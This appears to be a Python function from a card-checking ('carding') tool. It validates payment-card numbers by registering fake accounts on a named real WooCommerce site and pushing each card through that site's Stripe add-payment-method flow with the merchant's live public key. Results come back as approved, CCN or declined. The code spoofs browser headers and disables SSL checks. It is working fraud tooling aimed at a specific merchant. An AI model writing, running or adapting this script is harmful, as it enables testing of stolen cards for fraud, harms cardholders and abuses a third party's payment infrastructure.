# ==================== STRIPE AUTH CHECKER ====================
# Uses Stripe auth (no charge) on WooCommerce sites

STRIPE_AUTH_SITE = "https://thecenturyfitness.com"
STRIPE_AUTH_PK = "pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs"

async def stripe_auth_check(cc, mm, yy, cvv):
    """
    Check card via Stripe auth (add payment method, no charge).
    Returns: (result_type, details)
    """
    import re
    try:
        connector = aiohttp.TCPConnector(ssl=False, limit=5)
        timeout = aiohttp.ClientTimeout(total=60)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'no-cache',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            }
            
            # Step 1: Get registration page
            log(f"[STAUTH] Fetching {STRIPE_AUTH_SITE}/my-account/", "DEBUG")
            async with session.get(f'{STRIPE_AUTH_SITE}/my-account/', headers=headers) as resp:
                if resp.status != 200:
                    log(f"[STAUTH] Site returned HTTP {resp.status}", "WARNING")
                    return 'error', f'Site HTTP {resp.status}'
                html = await resp.text()
            
            # Find nonce - try multiple patterns
            nonce_match = re.search(r'name=["\']woocommerce-register-nonce["\']\s+value=["\']([^"\']+)["\']', html)
            if not nonce_match:
                nonce_match = re.search(r'id=["\']woocommerce-register-nonce["\']\s+[^>]*value=["\']([^"\']+)["\']', html)
            if not nonce_match:
                nonce_match = re.search(r'woocommerce-register-nonce["\']\s*value=["\']([^"\']+)["\']', html)
            
            if not nonce_match:
                # Check if site is blocking or has captcha
                if 'captcha' in html.lower() or 'recaptcha' in html.lower():
                    return 'error', 'Site has captcha'
                if 'blocked' in html.lower() or 'access denied' in html.lower():
                    return 'error', 'Site blocked access'
                if 'maintenance' in html.lower():
                    return 'error', 'Site in maintenance'
                log(f"[STAUTH] Could not find register nonce. HTML preview: {html[:500]}", "DEBUG")
                return 'error', 'Site structure changed'
            register_nonce = nonce_match.group(1)
            log(f"[STAUTH] Got register nonce: {register_nonce[:10]}...", "DEBUG")
            
            # Step 2: Register account
            email = f"test{random.randint(10000, 99999)}@gmail.com"
            reg_data = {
                'email': email,
                'woocommerce-register-nonce': register_nonce,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
            }
            
            async with session.post(f'{STRIPE_AUTH_SITE}/my-account/', headers=headers, data=reg_data) as resp:
                html = await resp.text()
            
            if 'logout' not in html.lower() and 'dashboard' not in html.lower():
                return 'error', 'Registration failed'
            
            # Step 3: Get add payment method page
            async with session.get(f'{STRIPE_AUTH_SITE}/my-account/add-payment-method/', headers=headers) as resp:
                html = await resp.text()
            
            # Find setup intent nonce
            setup_match = re.search(r'createSetupIntentNonce["\']?\s*:\s*["\']([^"\']+)["\']', html)
            if not setup_match:
                setup_match = re.search(r'wcpay_create_setup_intent_nonce["\']?\s*:\s*["\']([^"\']+)["\']', html)
            
            setup_nonce = setup_match.group(1) if setup_match else None
            
            add_nonce_match = re.search(r'name=["\']woocommerce-add-payment-method-nonce["\']\s+value=["\']([^"\']+)["\']', html)
            add_nonce = add_nonce_match.group(1) if add_nonce_match else None
            
            if not setup_nonce and not add_nonce:
                return 'error', 'Payment page unavailable'
            
            # Step 4: Create Stripe payment method
            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
            }
            
            stripe_data = {
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_month]': mm.zfill(2),
                'card[exp_year]': yy if len(yy) == 4 else f'20{yy}',
                'key': STRIPE_AUTH_PK,
                '_stripe_account': 'acct_1Pcx57C5HJMypzDl',
            }
            
            async with session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data) as resp:
                pm_result = await resp.json()
                
                if 'error' in pm_result:
                    error = pm_result['error']
                    code = error.get('decline_code', error.get('code', 'unknown'))
                    msg = error.get('message', 'Card declined')
                    
                    if 'cvc' in code.lower():
                        return 'ccn', f"CCN: {code}"
                    elif 'insufficient' in msg.lower():
                        return 'approved', "Insufficient Funds"
                    else:
                        return 'declined', f"{code}: {msg}"
                
                pm_id = pm_result.get('id')
                if not pm_id:
                    return 'error', 'No payment method'
            
            # Step 5: Create setup intent via AJAX
            ajax_headers = {
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'x-requested-with': 'XMLHttpRequest',
                'origin': STRIPE_AUTH_SITE,
            }
            
            ajax_data = {
                'action': 'create_setup_intent',
                'wcpay-payment-method': pm_id,
                '_ajax_nonce': setup_nonce or add_nonce,
            }
            
            async with session.post(f'{STRIPE_AUTH_SITE}/wp-admin/admin-ajax.php', headers=ajax_headers, data=ajax_data) as resp:
                try:
                    ajax_result = await resp.json()
                except:
                    return 'error', 'Invalid AJAX response'
                
                if ajax_result.get('success') is True:
                    return 'approved', "Card Approved"
                elif ajax_result.get('success') is False:
                    err = ajax_result.get('data', {})
                    if isinstance(err, dict):
                        err = err.get('error') or err.get('message') or 'Declined'
                    return 'declined', str(err)[:50]
                else:
                    return 'declined', 'Unknown response'
                    
    except asyncio.TimeoutError:
        return 'error', 'Timeout'
    except Exception as e:
        return 'error', str(e)[:50]


